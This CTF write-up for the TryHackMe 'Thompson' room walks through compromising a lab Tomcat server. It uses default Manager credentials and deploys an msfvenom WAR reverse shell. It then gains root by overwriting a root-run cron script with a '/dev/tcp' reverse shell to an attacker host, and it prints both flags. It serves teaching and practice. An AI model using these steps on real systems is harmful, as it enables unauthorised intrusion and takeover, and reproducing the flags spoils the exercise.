# TryHackMe — Thompson

> **Platform:** TryHackMe  
> **Room:** Thompson  
> **Difficulty:** Easy  
> **OS:** Linux (Ubuntu 16.04)  
> **Tags:** Tomcat, Default Credentials, WAR Deploy, Cron Privilege Escalation

---

## Attack Path Overview

```
Nmap Scan
  │
  ├── Port 22 — SSH (OpenSSH 7.2p2)
  ├── Port 8009 — AJP13 (Apache Jserv)
  └── Port 8080 — Apache Tomcat 8.5.5
          │
          ├── Gobuster → /manager/ found
          │
          ├── CVE-2017-12617 (PUT upload) → Not vulnerable
          ├── CVE-2020-1938 Ghostcat (AJP file read) → Confirmed, but no creds in web.xml
          │
          └── Default credentials tomcat:s3cret → Manager access
                  │
                  └── WAR reverse shell deploy → Shell as tomcat
                          │
                          └── Cron job runs /home/jack/id.sh as root (world-writable)
                                  │
                                  └── Overwrite id.sh with reverse shell → Root
```

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial 10.144.158.25
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
```

**Key findings:**
- Apache Tomcat 8.5.5 — outdated version from 2016
- AJP connector exposed on port 8009 — potential Ghostcat (CVE-2020-1938) vector
- SSH available for potential credential reuse later

### Directory Enumeration

```bash
gobuster dir -u http://10.144.158.25:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Relevant results:**

| Path | Status | Notes |
|------|--------|-------|
| `/docs/` | 302 | Tomcat documentation |
| `/examples/` | 302 | Default example servlets |
| `/manager/` | 302 | **Tomcat Manager — high value target** |

---

## Exploitation Attempts

### Attempt 1: CVE-2017-12617 — JSP Upload via PUT

Tomcat 8.5.5 falls within the vulnerable version range for CVE-2017-12617, which allows JSP file upload via the HTTP PUT method when `readonly=false` is set in the DefaultServlet configuration.

```bash
searchsploit -m 42966
python3 42966.py -u http://10.144.158.25:8080
```

**Result:** `Not Vulnerable to CVE-2017-12617` — PUT method is disabled (`readonly=true`).

### Attempt 2: CVE-2020-1938 — Ghostcat (AJP File Read)

The exposed AJP connector on port 8009 makes this target a candidate for Ghostcat. This vulnerability allows reading files within the webapp through the AJP protocol, which lacks authentication by design.

```bash
msfconsole -q
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 10.144.158.25
set FILENAME /WEB-INF/web.xml
run
```

**Result:** Successfully read `web.xml`, confirming the vulnerability. However, the file contained only the default Tomcat template with no credentials or sensitive configuration.

Path traversal attempts to reach `tomcat-users.xml` and other files outside the webapp were blocked by Tomcat's path normalization:

```
The resource path [//WEB-INF/../../conf/tomcat-users.xml] has been normalized to [null] which is not valid
```

### Attempt 3: Default Credentials — Success

With automated exploitation exhausted, manual testing of common Tomcat Manager credentials:

| Username | Password | Result |
|----------|----------|--------|
| `tomcat` | `s3cret` | **Access granted** |

> `s3cret` is a well-known default password that ships in Tomcat's `tomcat-users.xml` as a commented-out example. In many deployments it gets uncommented without being changed.

---

## Initial Access — WAR Reverse Shell

With valid Manager credentials, we can deploy a malicious WAR file containing a reverse shell.

### Generate Payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f war -o revshell.war
```

### Set Up Listener

```bash
nc -lvnp 4444
```

### Deploy via Manager

1. Navigate to `http://10.144.158.25:8080/manager/html`
2. Authenticate with `tomcat:s3cret`
3. Under **"WAR file to deploy"** → upload `revshell.war`
4. Click the deployed `/revshell` application in the list

### Shell Received

```
Connection received on 10.144.158.25 46022
```

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
tomcat@ubuntu:/$ whoami
tomcat
```

### User Flag

```bash
cat /home/jack/user.txt
```

```
39400c90bc683a41a8935e4719f181bf
```

---

## Privilege Escalation — Cron Job Abuse

### Enumeration

```bash
cat /etc/crontab
```

```
*  *  * * *  root  cd /home/jack && bash id.sh
```

A cron job runs `/home/jack/id.sh` as **root every minute**.

```bash
ls -la /home/jack/id.sh
```

```
-rwxrwxrwx 1 jack jack 26 Aug 14  2019 /home/jack/id.sh
```

The script is **world-writable** (`-rwxrwxrwx`), meaning any user — including `tomcat` — can overwrite it.

Original contents:

```bash
#!/bin/bash
id > test.txt
```

### Exploitation

Set up a second listener on the attacker machine:

```bash
nc -lvnp 5555
```

Overwrite the cron script with a reverse shell:

```bash
echo '#!/bin/bash' > /home/jack/id.sh
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1' >> /home/jack/id.sh
```

After waiting up to 60 seconds for the cron job to execute:

```
Connection received on 10.144.158.25 44722
root@ubuntu:/home/jack#
```

### Root Flag

```bash
cat /root/root.txt
```

```
d89d5391984c0450a95497153ae7ca3a
```

---

## Flags

| Flag | Value |
|------|-------|
| User | `39400c90bc683a41a8935e4719f181bf` |
| Root | `d89d5391984c0450a95497153ae7ca3a` |

---

## Key Takeaways

1. **Default credentials remain a top attack vector.** Tomcat's `s3cret` password is widely known, yet frequently left in production configurations.

2. **Tomcat Manager = instant RCE.** WAR file deployment is a legitimate feature that provides immediate code execution when credentials are compromised.

3. **Not every CVE leads to exploitation.** Both CVE-2017-12617 and CVE-2020-1938 (Ghostcat) were tested — the first wasn't vulnerable, the second confirmed but path traversal was blocked. Flexibility in methodology matters.

4. **World-writable scripts in cron = trivial privilege escalation.** A script executed by root should never be writable by unprivileged users. This is a textbook misconfiguration.

5. **Always check crontab early in enumeration.** Scheduled tasks running as root are one of the most common and reliable Linux privesc vectors in CTF environments and real-world engagements alike.

---

## Tools Used

- **Nmap** — port scanning and service enumeration
- **Gobuster** — directory brute-forcing
- **Metasploit** — Ghostcat module (`auxiliary/admin/http/tomcat_ghostcat`)
- **Searchsploit** — exploit database lookup (CVE-2017-12617)
- **msfvenom** — WAR reverse shell payload generation
- **Netcat** — reverse shell listener
